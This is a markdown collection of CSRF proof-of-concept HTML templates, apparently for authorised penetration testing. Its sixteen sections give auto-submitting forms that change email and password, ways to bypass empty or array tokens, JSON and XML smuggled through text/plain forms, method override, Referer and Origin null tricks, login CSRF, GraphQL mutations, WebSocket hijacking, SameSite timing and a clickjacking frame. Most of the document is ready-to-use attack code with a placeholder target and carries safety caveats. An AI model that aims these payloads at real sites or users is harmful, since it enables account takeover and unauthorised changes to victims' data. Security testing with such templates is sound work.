# CSRF PoC Templates

Host these on a domain you control or on `localhost`. Open them only in your own **victim** browser profile, logged into your own victim account. Replace `TARGET`, paths, and parameters. Keep the state change harmless and restore it afterward.

Burp Suite Professional: right-click a request, Engagement tools, Generate CSRF PoC, then Options to pick auto-submit and the encoding.

## 1. GET (link, image, navigation)

```html
<!-- Click -->
<a href="https://TARGET/endpoint?param=CSRF_TEST">Click</a>
<!-- No click (image fetch; cookie sent only if SameSite=None or legacy) -->
<img src="https://TARGET/endpoint?param=CSRF_TEST" style="display:none">
<!-- Top-level navigation (sends SameSite=Lax cookies) -->
<script>location = "https://TARGET/endpoint?param=CSRF_TEST";</script>
```

## 2. POST urlencoded, auto-submit

```html
<html><body>
<form id="f" action="https://TARGET/change-email" method="POST">
  <input type="hidden" name="email" value="attacker-own-inbox@example.test">
</form>
<script>document.getElementById("f").submit();</script>
</body></html>
```

## 3. Empty or invalid token variant

```html
<form id="f" action="https://TARGET/password_change" method="POST">
  <input type="hidden" name="new_password" value="Temp-Restore-Me-1">
  <input type="hidden" name="csrf_token" value="">          <!-- or undefined, or same-length random -->
</form>
<script>document.getElementById("f").submit();</script>
```

Array token (PHP / some Node parsers):

```html
<input type="hidden" name="csrf_token[]" value="">
```

## 4. multipart/form-data

```html
<form id="f" action="https://TARGET/profile" method="POST" enctype="multipart/form-data">
  <input type="hidden" name="display_name" value="CSRF_TEST">
</form>
<script>document.getElementById("f").submit();</script>
```

## 5. JSON via text/plain form (parameter padding)

The browser sends `name=value`. Put the JSON in the name and close it in the value, so the body becomes valid JSON plus a dummy key.

```html
<form id="f" action="https://TARGET/api/profile" method="POST" enctype="text/plain">
  <input type="hidden" name='{"display_name":"CSRF_TEST","pad":"' value='"}'>
</form>
<script>document.getElementById("f").submit();</script>
```

Body sent: `{"display_name":"CSRF_TEST","pad":"="}`

## 6. JSON via fetch / XHR (simple request, no preflight)

```html
<script>
fetch("https://TARGET/api/profile", {
  method: "POST",
  credentials: "include",
  mode: "no-cors",
  headers: {"Content-Type": "text/plain"},
  body: JSON.stringify({display_name: "CSRF_TEST"})
});
</script>
```

```html
<script>
var x = new XMLHttpRequest();
x.open("POST", "https://TARGET/api/profile");
x.withCredentials = true;
x.setRequestHeader("Content-Type", "text/plain");
x.send('{"display_name":"CSRF_TEST"}');
</script>
```

`application/json`, custom headers (`X-Requested-With`, `X-CSRF-Token`), or PUT/DELETE trigger a CORS preflight; they only work if CORS allows your origin with credentials (XSRF-020).

## 7. XML body

```html
<form id="f" action="https://TARGET/api/settings" method="POST" enctype="text/plain">
  <input type="hidden" name='<?xml version="1.0"?><settings><name>CSRF_TEST</name><pad a="' value='"/></settings>'>
</form>
<script>document.getElementById("f").submit();</script>
```

## 8. Method override

```html
<form id="f" action="https://TARGET/api/items/OWN_ITEM_ID" method="POST">
  <input type="hidden" name="_method" value="DELETE">
</form>
<script>document.getElementById("f").submit();</script>
```

Also try `?_method=PUT` in the query string, and JSON frameworks that read `X-HTTP-Method-Override` (needs CORS).

## 9. No Referer

```html
<html><head><meta name="referrer" content="no-referrer"></head><body>
<form id="f" action="https://TARGET/change-email" method="POST">
  <input type="hidden" name="email" value="attacker-own-inbox@example.test">
</form>
<script>document.getElementById("f").submit();</script>
</body></html>
```

## 10. Referer substring and domain confusion

```html
<html><head><meta name="referrer" content="unsafe-url"></head><body>
<form id="f" action="https://TARGET/phone.json" method="POST" enctype="text/plain">
  <input type="hidden" name='{"phone":"OWN_TEST_NUMBER","a":"' value='"}'>
</form>
<script>
  // Puts the target name into the Referer path: https://evil.example/anything@TARGET
  history.pushState("", "", "/anything@TARGET");
  document.getElementById("f").submit();
</script>
</body></html>
```

Variants for the PoC host: `TARGET.evil.example`, `evil.example/TARGET`, `evil.example/?TARGET`.

## 11. Origin: null (data: or sandboxed iframe)

```html
<iframe sandbox="allow-scripts allow-forms" srcdoc='
<form id="f" action="https://TARGET/api/auth" method="POST">
  <input type="hidden" name="display_name" value="CSRF_TEST">
</form>
<script>document.getElementById("f").submit();</script>'></iframe>
```

```html
<iframe src='data:text/html,<body onload="document.forms[0].submit()"><form action="https://TARGET/endpoint" method="POST"><input type="hidden" name="display_name" value="CSRF_TEST"></form></body>'></iframe>
```

Firefox has historically omitted Origin from data: iframes; Chrome sends `Origin: null`. Test both and record the browser version.

## 12. Login CSRF (victim logged into attacker account)

```html
<form id="f" action="https://TARGET/login" method="POST">
  <input type="hidden" name="username" value="OWN_ATTACKER_ACCOUNT">
  <input type="hidden" name="password" value="OWN_ATTACKER_PASSWORD">
</form>
<script>document.getElementById("f").submit();</script>
```

Show impact: the victim then enters data (card, search history, uploads) into the attacker's account. Pair with logout CSRF if the victim is already logged in.

## 13. GraphQL mutation

```html
<!-- GET -->
<img src="https://TARGET/graphql?query=mutation%7BupdateProfile(name%3A%22CSRF_TEST%22)%7Bid%7D%7D">
<!-- urlencoded POST -->
<form id="f" action="https://TARGET/graphql" method="POST">
  <input type="hidden" name="query" value='mutation{updateProfile(name:"CSRF_TEST"){id}}'>
</form>
<script>document.getElementById("f").submit();</script>
```

## 14. Cross-site WebSocket hijacking

```html
<script>
var ws = new WebSocket("wss://TARGET/socket");
ws.onopen = () => ws.send('{"action":"update_name","name":"CSRF_TEST"}');
ws.onmessage = e => console.log("received", e.data); // own account only; do not exfiltrate
</script>
```

## 15. SameSite=Lax: GET via top-level navigation and the 2-minute window

```html
<script>
// If the app accepts the state change as GET:
location = "https://TARGET/settings/update?display_name=CSRF_TEST";
</script>
```

```html
<script>
// Chrome Lax-by-default: cookies set in the last 2 minutes are sent on top-level POST.
// Refresh the victim's cookie first (for example an SSO re-login flow), then submit within 2 minutes.
window.open("https://TARGET/sso/refresh");
setTimeout(() => document.getElementById("f").submit(), 5000);
</script>
<form id="f" action="https://TARGET/change-email" method="POST">
  <input type="hidden" name="email" value="attacker-own-inbox@example.test">
</form>
```

## 16. Clickjacking frame test (for click-required actions)

```html
<html><head><title>Clickjack test page</title></head><body>
<p>Page is frameable if the iframe below is not blank.</p>
<iframe src="https://TARGET/settings" width="600" height="500" style="opacity:0.5"></iframe>
</body></html>
```

## Evidence to capture

- The PoC HTML, the browser name and version, the victim account ID (own), the state before and after, and the request captured in the proxy showing the cookie was sent without a valid token.
